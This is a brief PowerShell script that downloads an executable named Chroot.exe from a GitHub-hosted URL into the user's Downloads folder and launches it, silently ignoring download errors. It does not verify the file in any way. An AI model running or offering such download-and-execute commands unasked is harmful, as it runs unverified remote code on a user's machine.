$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/Chroot.exe"

$downloadPath = Join-Path $env:USERPROFILE "Downloads\Chroot.exe"

Invoke-WebRequest -Uri $url -OutFile $downloadPath -ErrorAction SilentlyContinue

if (Test-Path $downloadPath) {
    Start-Process -FilePath $downloadPath -Wait
} else {

}
